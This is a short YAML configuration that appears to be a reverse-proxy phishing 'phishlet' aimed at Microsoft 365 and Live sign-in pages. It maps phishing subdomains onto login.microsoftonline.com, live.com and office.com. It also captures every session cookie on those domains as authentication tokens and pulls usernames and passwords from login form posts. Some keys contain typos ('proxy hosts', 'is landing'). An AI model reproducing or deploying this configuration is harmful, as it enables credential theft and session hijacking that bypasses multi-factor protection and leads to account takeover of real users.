min_ver: '3.2.0'
proxy hosts: 
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true} 
  - {phish_sub: 'Logon', orig_sub: 'login', domain: 'live.com', session: true, is landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is landing: false}
sub_filters: 
auth_tokens:
  - domain: '.live.com'
    keys: ['.*:regexp']
  - domain: 'live.com'
    keys: ['.*:regexp']
  - domain: 'login.live.com'
    keys: ['.*:regexp']
  - domain: '.login.microsoftonline.com'
    keys: ['.*:regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['.*:regexp']
  - domain: 'microsoft.com'
    keys: ['.*:regexp']
  - domain: '.microsoft.com'
    keys: ['.*:regexp']
  - domain: '.office.com'
    keys: ['.*:regexp']
  - domain: 'office.com'
    keys: ['.*:regexp']
  - domain: 'www.office.com'
    keys: ['.*:regexp']
  - domain: '.www.office.com'
    keys: ['.*:regexp']
auth_urls: 
  - '/landingv2'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login: 
  domain: 'login.microsoft.com'
  path: '/'